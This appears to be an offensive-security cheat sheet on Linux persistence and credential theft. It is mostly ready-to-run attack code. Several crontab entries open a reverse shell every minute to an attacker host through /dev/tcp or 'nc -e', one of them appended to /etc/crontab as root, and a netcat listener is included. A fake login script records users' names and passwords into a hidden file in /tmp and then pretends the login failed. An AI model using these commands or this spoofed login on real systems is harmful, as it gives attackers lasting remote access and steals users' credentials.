#### Cronjob every 1 min
```
crontab -e
* * * * * 0<&196;exec 196<>/dev/tcp/$KALI/443; sh <&196 >&196 2>&196
```

```
* * * * * nc -e /bin/sh $KALI 443
```

```
echo "*  *  *  *  * root nc $KALI 443 -e /usr/bin/bash" >> /etc/crontab
```

Listener

```
nc -lvp 443
```

Sometimes you have to set the user

```
crontab -e
*/10 * * * * pelle /path/to/binary
```

#### credential stealer

login.sh
```
echo -n "Welcome to the LBL DNIx4 Computer"
echo -n "Please Log in now\n"
echo -n "LOGIN: "
read account_name #### OR set account_name

echo -n "ENTER YOUR PASSWORD: "
(stty -echo; \
read password; \
stty echo; \
echo " "; \
echo $account_name $password >> /tmp/.pub)
echo "Sorry, try again"
```

Then maybe do a cron for something like "@login"? "@reboot"?  Maybe point to this script from another program?
